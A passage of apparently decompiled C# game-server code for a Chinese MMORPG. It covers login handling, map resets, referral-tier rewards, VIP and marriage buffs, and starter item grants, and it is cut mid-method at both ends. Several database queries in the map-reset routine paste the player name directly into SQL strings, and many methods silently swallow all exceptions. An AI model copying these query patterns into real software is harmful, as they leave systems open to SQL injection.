								long num3 = (ticks3 - ticks4) / 10000;
								追加状态类 追加状态类4 = new 追加状态类(this, num3, 900000046.0, 1.0);
								追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
								状态效果(BitConverter.GetBytes(900000046), 1, (int)num3);
								base.FLD_人物_追加_攻击 += 60;
								base.FLD_人物_追加_防御 += 60;
								base.人物追加最大_HP += 300;
								更新HP_MP_SP();
								更新武功和状态();
								更新气功();
							}
							系统提示("你的门战奖励到期时间是:" + value3.RewardTime.ToString("yyyy年MM月dd日hh时mm分"), 9, "系统提示");
						}
						else if (value3.GuildName != base.帮派名字 && 追加状态列表.ContainsKey(900000047))
						{
							追加状态列表[900000047].时间结束事件();
						}
						else if (value3.GuildName != base.帮派名字 && 追加状态列表.ContainsKey(900000046))
						{
							追加状态列表[900000046].时间结束事件();
						}
					}
					if (World.天魔神宫占领者.Length > 0)
					{
						系统提示("天魔神宫已经被门派《" + World.天魔神宫占领者 + "》占领!", 10, "系统提示");
					}
					if (base.宣告攻城 == 1)
					{
						发送攻城相关BUFF(是否消失: false);
					}
					num = 53;
					重置地图();
					num = 54;
					检测神器斗战增加状态();
					num = 55;
					检测装备强化数();
				}
				else if (base.Client != null)
				{
					MainForm.WriteLine(100, "人物换线登陆出错");
					OpClient(1);
					base.Client.Dispose();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(100, "人物登陆出错2[" + base.Userid + "]-[" + base.UserName + "] " + num + " " + ex.Message);
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
			}
		}

		public void 检查地图()
		{
			if (base.人物坐标_地图 == 7001 || base.人物坐标_地图 == 7301 || base.人物坐标_地图 == 42001 || base.人物坐标_地图 == 42002 || base.人物坐标_地图 == 30000 || base.人物坐标_地图 == 30100 || base.人物坐标_地图 == 30200 || base.人物坐标_地图 == 30300 || base.人物坐标_地图 == 32002 || base.人物坐标_地图 == 2301)
			{
				if (World.老泫勃派开关 == 1)
				{
					移动(495f, 1727f, 15f, 29000);
				}
				else
				{
					移动(420f, 1550f, 15f, 101);
				}
			}
		}

		public void 统计代理级别()
		{
			int num = 0;
			DataTable dataTable = RxjhClass.得到下线账号(base.FLD_推广ID.ToString());
			if (dataTable != null)
			{
				if (dataTable.Rows.Count > 0)
				{
					for (int i = 0; i < dataTable.Rows.Count; i++)
					{
						DataTable dataTable2 = RxjhClass.得到人物数据ID(dataTable.Rows[i]["FLD_ID"].ToString());
						if (dataTable2 == null)
						{
							continue;
						}
						if (dataTable2.Rows.Count > 0)
						{
							for (int j = 0; j < dataTable2.Rows.Count; j++)
							{
								int num2 = (int)dataTable2.Rows[j]["FLD_LEVEL"];
								int num3 = (int)dataTable2.Rows[j]["FLD_JOB_LEVEL"];
								if (num2 >= 61 && num3 >= 3)
								{
									num++;
								}
							}
						}
						dataTable2.Dispose();
					}
				}
				dataTable.Dispose();
			}
			int fLD_SPREADER_LEVEL = base.FLD_SPREADER_LEVEL;
			switch (base.FLD_SPREADER_LEVEL)
			{
			case 0:
				if (num >= 10)
				{
					base.FLD_SPREADER_LEVEL = 3;
				}
				else if (num >= 5)
				{
					base.FLD_SPREADER_LEVEL = 2;
				}
				else if (num >= 2)
				{
					base.FLD_SPREADER_LEVEL = 1;
				}
				break;
			case 1:
				if (num >= 10)
				{
					base.FLD_SPREADER_LEVEL = 3;
				}
				else if (num >= 5)
				{
					base.FLD_SPREADER_LEVEL = 2;
				}
				break;
			case 2:
				if (num >= 10)
				{
					base.FLD_SPREADER_LEVEL = 3;
				}
				break;
			}
			if (base.FLD_SPREADER_LEVEL > 0)
			{
				系统提示("您的推广ID为：" + base.FLD_推广ID + " 等级为：V" + base.FLD_SPREADER_LEVEL + "级 推广人数：" + num + "人", 6, "提示");
				int num4 = 0;
				int num5 = 0;
				int num6 = 0;
				if (base.FLD_SPREADER_LEVEL == 1)
				{
					num4 = 1;
					num5 = 1;
					num6 = 2;
				}
				else if (base.FLD_SPREADER_LEVEL == 2)
				{
					num4 = 2;
					num5 = 2;
					num6 = 5;
				}
				else if (base.FLD_SPREADER_LEVEL == 3)
				{
					num4 = 3;
					num5 = 5;
					num6 = 10;
				}
				系统提示("享受推广福利：经验+" + num4 + "%, 爆率+" + num5 + "%, 本推广ID名下玩家消费返" + num6 + "%元宝", 6, "提示");
			}
			else
			{
				系统提示("您的推广ID为：" + base.FLD_推广ID + " 推广人数：" + num + "人", 6, "提示");
			}
			if (fLD_SPREADER_LEVEL != base.FLD_SPREADER_LEVEL)
			{
				SaveGemData();
			}
		}

		public void 其他()
		{
			try
			{
				if (World.是否开启安全码 != 1)
				{
					安全码是否通过验证 = true;
					安全码锁状态(2);
				}
				else if (base.zastcoginip == base.lastloginip)
				{
					安全码是否通过验证 = true;
					安全码锁状态(2);
				}
				else
				{
					安全码是否通过验证 = false;
					安全码锁状态(1);
				}
				if (World.是否开启多开提示 == 1 && World.在线多开数量 != 0)
				{
					if (查询已登陆帐号数量(base.Client.ToString()) != 0)
					{
						系统提示("当前登录IP[" + base.Client.ToString() + "], 在线:[" + (World.记录多开数量 + 1) + "]离线:[" + (查询已登陆帐号数量(base.Client.ToString()) - (World.记录多开数量 + 1)) + "]人, 限制:[" + World.在线多开数量 + "]开[" + (World.允许多开数量 - World.在线多开数量) + "]离线", 3, "提示");
					}
					else
					{
						系统提示("当前登录IP[" + base.Client.ToString() + "], 是信任IP.可以无限开放", 3, "提示");
					}
				}
				if (base.FLD_VIP == 1)
				{
					if (DateTime.Now > base.FLD_VIPTIM)
					{
						系统提示("你的VIP时间已到期, 请联系客服充值。");
						base.FLD_VIP = 0;
					}
					else
					{
						if (World.Vip上线公告 == 1)
						{
							World.发送游戏特殊公告(string.Format(World.Vip上线公告内容, base.UserName), 6, "公告");
						}
						获取称号类型(1008001584, 1);
						系统提示("你的VIP到期时间是:" + base.FLD_VIPTIM.ToString("yyyy年MM月dd日 hh时mm分"));
						base.FLD_人物_追加_经验百分比 += World.VIP经验增加百分比;
						base.FLD_人物_追加_历练百分比 += World.VIP历练增加百分比;
						base.FLD_人物_追加_合成成功率百分比 += World.VIP合成率增加百分比;
						系统提示("Vip用户获得经验5%，合成概率5%额外加成！");
					}
				}
				if (base.FLD_QCVIP == 1 && base.FLD_QCVIPTIM >= DateTime.Now)
				{
					if (DateTime.Now > base.FLD_QCVIPTIM)
					{
						系统提示("你的八彩VIP时间以到期,请联系客服充值", 9, "系统提示");
						base.FLD_QCVIP = 0;
					}
					else
					{
						if (World.八彩提示是否开启 == 1)
						{
							string[] array = World.八彩红色提示内容.Split(';');
							string[] array2 = World.八彩赤色提示内容.Split(';');
							string[] array3 = World.八彩橙色提示内容.Split(';');
							string[] array4 = World.八彩绿色提示内容.Split(';');
							string[] array5 = World.八彩蓝色提示内容.Split(';');
							string[] array6 = World.八彩深蓝提示内容.Split(';');
							string[] array7 = World.八彩紫色提示内容.Split(';');
							string[] array8 = World.八彩浅色提示内容.Split(';');
							foreach (Players value in World.AllConnectedPlayers.Values)
							{
								string text = string.Format(array[0], base.UserName);
								string text2 = string.Format(array2[0], base.UserName);
								string text3 = string.Format(array3[0], base.UserName);
								string text4 = string.Format(array4[0], base.UserName);
								string text5 = string.Format(array5[0], base.UserName);
								string text6 = string.Format(array6[0], base.UserName);
								string text7 = string.Format(array7[0], base.UserName);
								string text8 = string.Format(array8[0], base.UserName);
								value.系统提示(text ?? "", 20, array[1] ?? "");
								value.系统提示(text2 ?? "", 21, array2[1] ?? "");
								value.系统提示(text3 ?? "", 22, array3[1] ?? "");
								value.系统提示(text4 ?? "", 23, array4[1] ?? "");
								value.系统提示(text5 ?? "", 24, array5[1] ?? "");
								value.系统提示(text6 ?? "", 25, array6[1] ?? "");
								value.系统提示(text7 ?? "", 26, array7[1] ?? "");
								value.系统提示(text8 ?? "", 3, array8[1] ?? "");
							}
							base.八彩_追加_攻击 += int.Parse(World.八彩属性增加[0]);
							base.八彩_追加_防御 += int.Parse(World.八彩属性增加[1]);
							base.人物基本最大_HP += int.Parse(World.八彩属性增加[2]);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_物品掉落概率百分比 += 0.05;
							系统提示("八彩VIP附加[攻击:" + World.八彩属性增加[0] + "][防御:" + World.八彩属性增加[1] + "][生命:" + World.八彩属性增加[2] + "][经验:\" 5% \"][爆率:\"5% \"]", 9, "系统提示");
						}
						系统提示("你的八彩VIP截止时间是:" + base.FLD_QCVIPTIM.ToString("yyyy年MM月dd日 hh时mm分"), 9, "系统提示");
					}
				}
				if (是否已婚 == 1)
				{
					系统提示("已婚玩家获得经验10%，概率10%额外加成！");
				}
				else
				{
					World.发送游戏特殊公告(string.Format(World.普通上线公告内容, base.UserName), 6, "公告");
				}
				if (World.赞助大使名字 != string.Empty && base.UserName == World.赞助大使名字)
				{
					World.发送公告(string.Format(World.神豪上线公告内容, base.UserName));
				}
				if (base.Player_Job < 1 || base.Player_Job > 13)
				{
					封号(720, base.Userid, "非法人物职业_人物登陆3");
					return;
				}
				if (base.人物_HP <= 0)
				{
					移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					base.人物_HP = base.人物最大_HP;
					base.Player死亡 = false;
				}
				if (base.FLD_情侣.Length != 0)
				{
					计算爱情度等级(base.FLD_情侣_爱情度);
					Players players = World.检查玩家name(base.FLD_情侣);
					if (players != null)
					{
						players.更新情侣系统(2, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
						players.情侣提示(1, players.UserName, base.UserName);
						更新情侣系统(2, players.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
						情侣提示(1, base.UserName, players.UserName);
					}
					else
					{
						更新情侣系统(1, base.FLD_情侣, 婚戒刻字, 解除关系倒计时, DateTime.Now);
					}
					记算夫妻武功攻击力数据();
				}
				上次坐标X = base.人物坐标_X;
				上次坐标Y = base.人物坐标_Y;
				if (base.Player_Job == 11 && base.人物_AP < base.人物最大_AP)
				{
					base.人物_AP = base.人物最大_AP;
					if (障力恢复时间计数器 != null)
					{
						障力恢复时间计数器.Enabled = false;
						障力恢复时间计数器.Close();
						障力恢复时间计数器.Dispose();
					}
					障力恢复时间计数器 = new System.Timers.Timer(1000.0);
					障力恢复时间计数器.Elapsed += 障力恢复;
					障力恢复时间计数器.Enabled = true;
					障力恢复时间计数器.AutoReset = true;
				}
			}
			catch
			{
			}
		}

		public void 计算爱情度等级(int 情侣爱情度)
		{
			try
			{
				if (base.FLD_情侣_爱情度 >= 35000)
				{
					base.FLD_情侣_爱情度 = 35000;
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 30000)
				{
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 21000)
				{
					FLD_爱情度等级 = 2;
				}
				else if (base.FLD_情侣_爱情度 > 14700)
				{
					FLD_爱情度等级 = 3;
				}
				else if (base.FLD_情侣_爱情度 > 10290)
				{
					FLD_爱情度等级 = 4;
				}
				else if (base.FLD_情侣_爱情度 > 7203)
				{
					FLD_爱情度等级 = 5;
				}
				else if (base.FLD_情侣_爱情度 > 5042)
				{
					FLD_爱情度等级 = 6;
				}
				else if (base.FLD_情侣_爱情度 > 3025)
				{
					FLD_爱情度等级 = 7;
				}
				else if (base.FLD_情侣_爱情度 > 1513)
				{
					FLD_爱情度等级 = 8;
				}
				else if (base.FLD_情侣_爱情度 > 605)
				{
					FLD_爱情度等级 = 9;
				}
				else
				{
					FLD_爱情度等级 = 10;
				}
			}
			catch
			{
			}
		}

		public void 重置地图()
		{
			try
			{
				switch (base.人物坐标_地图)
				{
				case 41001:
					if (World.活动开启中 != 1)
					{
						if (World.仙魔大战掉线玩家 == null)
						{
							break;
						}
						if (!World.申请仙魔大战人物列表.ContainsKey(base.UserName))
						{
							World.申请仙魔大战人物列表.TryAdd(base.UserName, this);
						}
						DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_在线=1 WHERE FLD_名字='" + base.UserName + "'");
						DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '仙族' AND FLD_在线=1");
						DataTable dBToDataTable2 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '魔族' AND FLD_在线=1");
						World.仙魔大战正人数 = dBToDataTable.Rows.Count;
						World.仙魔大战邪人数 = dBToDataTable2.Rows.Count;
						DataTable dBToDataTable3 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_名字='" + base.UserName + "'");
						base.仙魔大战派别 = dBToDataTable3.Rows[0]["FLD_种族"].ToString();
						string value = string.Empty;
						if (!World.仙魔大战掉线玩家.TryGetValue(base.UserName, out value))
						{
							break;
						}
						if (base.仙魔大战派别 == "仙族")
						{
							if (World.是否开启共用银币市场 == 1)
							{
								换线移动(-100f, 150f, 15f, 41001);
							}
							else
							{
								切换PK模式(1);
								系统提示("跨线进入〈仙魔大战〉", 21, "仙族");
							}
						}
						else if (base.仙魔大战派别 == "魔族")
						{
							if (World.是否开启共用银币市场 == 1)
							{
								换线移动(-100f, -250f, 15f, 41001);
							}
							else
							{
								切换PK模式(1);
								系统提示("跨线进入〈仙魔大战〉", 21, "魔族");
							}
						}
						World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
					}
					else
					{
						World.conn.发送("移除仙魔大战掉线|" + base.UserName + "|" + base.仙魔大战派别);
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(529f, 1528f, 15f, 101);
						}
					}
					break;
				case 801:
					if (World.活动开启中 != 1)
					{
						switch (base.Player_Zx)
						{
						case 0:
							移动(529f, 1528f, 15f, 101);
							break;
						case 1:
							if (World.是否开启共用银币市场 == 1)
							{
								换线移动(520f, 0f, 15f, 801);
							}
							World.势力战正派参战人数++;
							break;
						case 2:
							if (World.是否开启共用银币市场 == 1)
							{
								换线移动(-520f, 0f, 15f, 801);
							}
							World.势力战邪派参战人数++;
							break;
						}
					}
					else if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(529f, 1528f, 15f, 101);
					}
					break;
				case 2301:
				case 2311:
				case 2341:
				case 3001:
				case 3101:
				case 7001:
				case 7101:
				case 7301:
				case 9001:
				case 9101:
				case 9201:
				case 20001:
				case 21001:
				case 25208:
				case 25209:
				case 25210:
				case 30000:
				case 30100:
				case 30200:
				case 30300:
				case 32002:
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(529f, 1528f, 15f, 101);
					}
					break;
				case 42001:
					if (World.SiegeWar != null && World.攻城战进程 != 0)
					{
						if (base.人物坐标_地图 == 42001)
						{
							切换PK模式(2);
							系统提示("跨线进入〈天魔攻城战〉", 21, "系统提示");
						}
					}
					else if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(529f, 1528f, 15f, 101);
					}
					break;
				}
			}
			catch
			{
			}
		}

		public void 气功书礼包()
		{
			switch (base.Player_Job)
			{
			case 1:
				foreach (升天气功总类 value in World.升天气功List.Values)
				{
					if (value.人物职业1 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 2:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000247), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value6 in World.升天气功List.Values)
				{
					if (value6.人物职业2 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value6.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 3:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000248), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value7 in World.升天气功List.Values)
				{
					if (value7.人物职业3 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value7.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 4:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000249), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value8 in World.升天气功List.Values)
				{
					if (value8.人物职业4 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value8.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 5:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000313), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000314), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000315), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000316), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000317), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value9 in World.升天气功List.Values)
				{
					if (value9.人物职业5 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value9.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 6:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000318), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value10 in World.升天气功List.Values)
				{
					if (value10.人物职业6 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value10.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 7:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000320), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value11 in World.升天气功List.Values)
				{
					if (value11.人物职业7 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value11.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 8:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000570), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value12 in World.升天气功List.Values)
				{
					if (value12.人物职业8 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value12.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 9:
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000001009), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
				foreach (升天气功总类 value13 in World.升天气功List.Values)
				{
					if (value13.人物职业9 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value13.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 10:
				foreach (升天气功总类 value2 in World.升天气功List.Values)
				{
					if (value2.人物职业10 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value2.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 11:
				foreach (升天气功总类 value3 in World.升天气功List.Values)
				{
					if (value3.人物职业11 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value3.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 12:
				foreach (升天气功总类 value4 in World.升天气功List.Values)
				{
					if (value4.人物职业12 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value4.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			case 13:
				foreach (升天气功总类 value5 in World.升天气功List.Values)
				{
					if (value5.人物职业13 == 1)
					{
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value5.物品ID), 得到行囊空位(this), BitConverter.GetBytes(1), new byte[56]);
					}
				}
				break;
			}
		}

		public void 新手上线()
		{
			try
			{
				if (World.是否开启新手上线设置 != 1 || base.Player_Level != 1)
				{
					return;
				}
				World.脚本.设置玩家等级(base.人物全服ID, World.上线等级);
				if (World.赠送气功书 != 1)
				{
					return;
				}
				新学气功(5, 1);
				新学气功(6, 1);
				新学气功(7, 1);
				新学气功(8, 1);
				新学气功(9, 1);
				新学气功(10, 1);
				switch (base.Player_Job)
				{
				case 1:
					foreach (升天气功总类 value in World.升天气功List.Values)
					{
						if (value.人物职业1 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 2:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000247), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value6 in World.升天气功List.Values)
					{
						if (value6.人物职业2 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value6.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 3:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000248), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value7 in World.升天气功List.Values)
					{
						if (value7.人物职业3 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value7.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 4:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000249), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value8 in World.升天气功List.Values)
					{
						if (value8.人物职业4 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value8.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 5:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000313), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000314), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000315), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000316), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000317), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value9 in World.升天气功List.Values)
					{
						if (value9.人物职业5 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value9.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 6:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000318), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value10 in World.升天气功List.Values)
					{
						if (value10.人物职业6 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value10.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 7:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000320), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value11 in World.升天气功List.Values)
					{
						if (value11.人物职业7 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value11.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 8:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000570), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000564), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000565), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000566), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value12 in World.升天气功List.Values)
					{
						if (value12.人物职业8 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value12.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 9:
					增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000001009), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
					foreach (升天气功总类 value13 in World.升天气功List.Values)
					{
						if (value13.人物职业9 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value13.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 10:
					foreach (升天气功总类 value2 in World.升天气功List.Values)
					{
						if (value2.人物职业10 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value2.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 11:
					foreach (升天气功总类 value3 in World.升天气功List.Values)
					{
						if (value3.人物职业11 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value3.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 12:
					foreach (升天气功总类 value4 in World.升天气功List.Values)
					{
						if (value4.人物职业12 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value4.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				case 13:
					foreach (升天气功总类 value5 in World.升天气功List.Values)
					{
						if (value5.人物职业13 == 1)
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value5.物品ID), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
						}
					}
					break;
				}
				更新人物数据(this);
				更新武功和状态();
			}
			catch
			{
			}
		}

		public void 结婚BUFF()
		{
			try
			{
				if (是否已婚 == 1)
				{
					if (GetAddState(242))
					{
						追加状态列表[242].时间结束事件();
					}
					追加状态列表.Add(242, new 追加状态类(this, 604800000, 242, 0));
					状态效果(242, 1, 1, 3600000);
					base.FLD_人物_追加_攻击 += 15;
					base.FLD_人物_追加_防御 += 15;
					base.人物追加最大_HP += 300;
					base.人物追加最大_MP += 300;
					base.FLD_人物_追加_回避 += 15;
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_物品掉落概率百分比 += 0.1;
					base.FLD_结婚礼物_追加_属性石 = 1;
				}
			}
			catch
			{
			}
		}

		public void 更新移动速度()
		{
			try
			{
				最大移动速度 = float.Parse(World.移动速度[1]);
				if (追加状态列表 == null)
				{
					追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
				}
				if (追加状态列表.ContainsKey(601101))
				{
					最大移动速度 = float.Parse(World.移动速度[2]);
				}
				else if (追加状态列表.ContainsKey(601102))
				{
					最大移动速度 = float.Parse(World.移动速度[3]);
				}
				else if (追加状态列表.ContainsKey(601103))
				{
					最大移动速度 = float.Parse(World.移动速度[4]);
				}
				else if (人物灵兽 != null && 人物灵兽.骑 == 1)
				{
					最大移动速度 = float.Parse(World.移动速度[5]);
				}
				else if (跑走)
				{
					最大移动速度 = float.Parse(World.移动速度[1]);
				}
				else if (!跑走)
				{
					最大移动速度 = float.Parse(World.移动速度[0]);
				}
			}
			catch (Exception ex)
			{
				最大移动速度 = 100f;
